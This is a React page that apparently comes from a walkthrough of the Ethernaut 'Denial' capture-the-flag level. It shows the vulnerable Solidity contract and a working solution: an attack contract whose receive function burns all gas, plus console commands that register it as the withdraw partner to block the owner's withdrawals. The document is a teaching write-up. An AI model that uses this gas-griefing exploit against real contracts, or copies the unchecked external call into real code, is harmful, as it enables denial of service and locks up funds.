import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const Denial = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  contract Denial {
  
      address public partner; // withdrawal partner - pay the gas, split the withdraw
      address public constant owner = address(0xA9E);
      uint timeLastWithdrawn;
      mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
  
      function setWithdrawPartner(address _partner) public {
          partner = _partner;
      }
  
      // withdraw 1% to recipient and 1% to owner
      function withdraw() public {
          uint amountToSend = address(this).balance / 100;
          // perform a call without checking return
          // The recipient can revert, the owner will still get their share
          partner.call{value:amountToSend}("");
          payable(owner).transfer(amountToSend);
          // keep track of last withdrawal time
          timeLastWithdrawn = block.timestamp;
          withdrawPartnerBalances[partner] +=  amountToSend;
      }
  
      // allow deposit of funds
      receive() external payable {}
  
      // convenience function
      function contractBalance() public view returns (uint) {
          return address(this).balance;
      }
  }`;

  const solutionCode = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttack {
    uint256 n;

    function burn() internal {
        while (gasleft() > 0) {
            n += 1;
        }
    }

    receive() external payable {
        burn();
    }
}

  await contract.setWithdrawPartner('0x7EcdCEbc92a9677B0f49Abd7779672cB38305021')

  await contract.withdraw()
`;

  return (
    <div>
      <h1 className="headerText">Denial</h1>
      <div className="content"> 
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="
            For hacking this level, we need to create one contract, which after receive will burn max gas, and contract will throw out of gas.
          "
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default Denial;
